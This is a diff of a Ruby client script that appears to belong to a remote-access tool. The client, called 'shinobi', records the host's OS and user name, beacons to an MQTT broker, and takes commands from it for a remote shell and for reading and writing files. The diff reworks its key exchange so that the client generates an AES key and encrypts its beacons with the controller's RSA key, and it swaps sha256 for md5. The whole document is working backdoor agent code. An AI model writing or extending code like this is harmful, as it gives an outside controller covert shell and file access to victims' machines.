@@ -11,12 +11,21 @@ require_relative 'core/serialization'
 require_relative 'inators/remoteshell'
 require_relative 'inators/filerw'
 
-Encryption::RSA.config({
-	:key_size => 2048
+cipher = OpenSSL::Cipher::AES.new(128, :CTR)
+aes = {
+  :key => cipher.random_key,
+  :iv => cipher.random_iv,
+}
+
+Encryption::AES.config({
+	:key_lenght => 128,
+	:mode => :CTR,
+	:key => aes[:key],
+	:iv => aes[:iv]
 })
 
 Encryption::Digest.config({
-	:digest => "sha256"
+	:digest => "md5"
 })
 
 Serialization.config({
@@ -27,12 +36,12 @@ shinobi = {
 	:id => SecureRandom.hex(2),
 	:host => (OS.windows? ? `ver` : `uname -sr`).strip,
 	:user => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip,
-	:status => :offline
+	:status => :offline,
+	:aes => aes
 }
 
 mqtt_topics = {
-	:rsa									=> "/bu/shinobi/#{shinobi[:id]}/rsa",
-	:aes									=> "/bu/shinobi/#{shinobi[:id]}/aes",
+	:public_key						=> "/bu/public_key",
 	:shinobi							=> "/bu/shinobi/#{shinobi[:id]}",
 	:remoteshell					=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell",
 	:remoteshell_open			=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/open",
@@ -67,11 +76,11 @@ mqtt_settings = {
 	:persistent => true,
 	:blocking => true,
 	:reconnect_limit => 3,
-	:reconnect_delay => 60,
-	:will_topic => mqtt_topics[:shinobi],
-	:will_payload => shinobi.to_json,
-	:will_qos => 2,
-	:will_retain => false
+	:reconnect_delay => 60
+	#:will_topic => mqtt_topics[:shinobi],
+	#:will_payload => shinobi,
+	#:will_qos => 2,
+	#:will_retain => false
 }
 
 mqtt_client = PahoMqtt::Client.new(mqtt_settings)
@@ -79,19 +88,12 @@ remoteshell_inator = Inator::RemoteShell.new
 filerw_inator = Inator::FileReadWrite.new
 
 mqtt_client.on_connack do
-	mqtt_client.publish(mqtt_topics[:rsa], Encryption::RSA.public_key, false, 1)
-	mqtt_client.subscribe([mqtt_topics[:aes], 2])
+	mqtt_client.subscribe([mqtt_topics[:public_key], 2])
 end
 
-mqtt_client.add_topic_callback(mqtt_topics[:aes]) do |packet|
-	packet = Encryption::RSA.decrypt(packet.payload)
-	packet = Serialization.deserialize(packet)
-
-	Encryption::AES.config({
-		:key_lenght => 128,
-		:mode => :CTR,
-		:key => packet.key,
-		:iv => packet.iv
+mqtt_client.add_topic_callback(mqtt_topics[:public_key]) do |packet|
+	Encryption::RSA.config({
+		:encoded_key => packet.payload
 	})
 
 	shinobi[:status] = :online
@@ -99,7 +101,7 @@ mqtt_client.add_topic_callback(mqtt_topics[:aes]) do |packet|
 	Thread.new do
 		loop do
 			packet = Serialization.serialize(shinobi)
-			packet = Encryption::AES.encrypt(packet)
+			packet = Encryption::RSA.encrypt(packet)
 			mqtt_client.publish(mqtt_topics[:shinobi], packet, false, 1)
 			sleep mqtt_client.keep_alive
 		end
@@ -239,6 +241,7 @@ filerw_inator.on :error do |file, error|
 end
 
 mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)
+
 mqtt_topics.each do |key, value|
 	if value.include? Encryption::Digest.digest('cmds') then
 		mqtt_client.subscribe([value, 2])
